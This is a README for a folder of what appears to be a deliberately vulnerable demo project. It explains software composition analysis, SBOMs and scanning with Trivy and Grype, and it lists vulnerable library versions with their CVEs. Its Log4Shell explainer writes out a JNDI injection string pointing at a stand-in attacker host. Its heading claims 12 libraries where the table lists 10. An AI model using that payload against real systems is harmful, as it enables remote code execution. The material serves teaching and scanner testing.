# 📁 `sca/` — Software Composition Analysis & SBOM

## What Is This?

Modern applications don't just use code you write — they import **hundreds of
open-source libraries**. SCA (Software Composition Analysis) checks whether any of
those libraries have known security vulnerabilities (CVEs).

**SBOM (Software Bill of Materials)** is a complete list of all software components —
like a food ingredient label, but for software.

## What's In This Folder?

| File | Format | Purpose |
|------|--------|---------|
| `sbom_cyclonedx.json` | CycloneDX 1.4 | SBOM with 12 known-vulnerable components |

## The 12 Vulnerable Libraries in the SBOM

| Library | CVE | CVSS | Vulnerability |
|---------|-----|------|--------------|
| log4j-core 2.14.1 | CVE-2021-44228 | **10.0 CRITICAL** | Log4Shell — RCE via JNDI |
| spring-webmvc 5.3.17 | CVE-2022-22965 | **9.8 CRITICAL** | Spring4Shell — RCE |
| commons-text 1.9 | CVE-2022-42889 | **9.8 CRITICAL** | Text4Shell — RCE |
| node-serialize 0.0.4 | CVE-2017-5941 | **9.8 CRITICAL** | Deserialization RCE |
| jackson-databind 2.9.10 | CVE-2019-14379 | **9.8 CRITICAL** | Deserialization gadget |
| django 2.2.0 | CVE-2022-28347 | **9.8 CRITICAL** | SQL Injection |
| pyyaml 5.3.1 | CVE-2020-14343 | **9.8 CRITICAL** | RCE via yaml.load() |
| lodash 4.17.15 | CVE-2021-23337 | 7.2 HIGH | Command injection |
| pillow 8.1.0 | CVE-2021-34552 | 7.5 HIGH | Buffer overflow |
| openssl 1.1.1l | CVE-2022-0778 | 7.5 HIGH | Infinite loop DoS |

## What Is Log4Shell? (The Famous One)

**Log4Shell (CVE-2021-44228, CVSS 10.0)** was discovered in December 2021 and affected
almost every Java application on the planet. Here's how it worked:

```
1. Log4j (a Java logging library) was used to record what users typed
2. If you typed "${jndi:ldap://attacker.com/exploit}" into any text field...
3. ...Log4j would reach out to attacker.com and download malicious code
4. ...and execute it on the server — full Remote Code Execution!

The fix: upgrade to log4j 2.17.1 or later
```

## How Does CycloneDX SBOM Work?

```json
{
  "bomFormat": "CycloneDX",
  "components": [
    {
      "name": "log4j-core",
      "version": "2.14.1",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1"
    }
  ],
  "vulnerabilities": [
    { "id": "CVE-2021-44228", "ratings": [{"score": 10.0}] }
  ]
}
```

Tools like **Trivy**, **Grype**, and **TigerGate** ingest this SBOM and cross-reference
every component against CVE databases to find which ones need patching.

## How to Scan for Vulnerable Libraries

```bash
# Scan with Trivy (file system scan)
make scan-trivy-sca

# Scan just the SBOM file
trivy sbom sca/sbom_cyclonedx.json

# Grype (alternative scanner)
grype sbom:sca/sbom_cyclonedx.json
```

## Learn More
- [GLOSSARY.md](../GLOSSARY.md) → look up: SCA, SBOM, CVE, CVSS Score
- [CycloneDX Specification](https://cyclonedx.org/specification/overview/)
- [National Vulnerability Database (NVD)](https://nvd.nist.gov)
